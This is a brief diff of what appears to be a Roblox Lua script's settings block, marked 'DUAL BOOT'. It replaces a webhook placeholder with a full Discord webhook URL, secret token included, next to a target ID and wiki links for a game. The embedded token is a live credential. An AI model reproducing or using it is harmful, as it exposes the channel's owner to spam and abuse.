@@ -11,7 +11,7 @@ task.spawn(function()
 -- DUAL BOOT
 task.spawn(function()
 
-local GOOD_WEBHOOK = "YOUR WEBHOOK HERE"
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1494020666637160448/k5Wedfs474-75sVWHwDw_IsYVWPpm_TAS2mT7yScgqHAgGiubuaWUpM5VQx9O4i-I2b6"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TARGET_ID = 6219924104
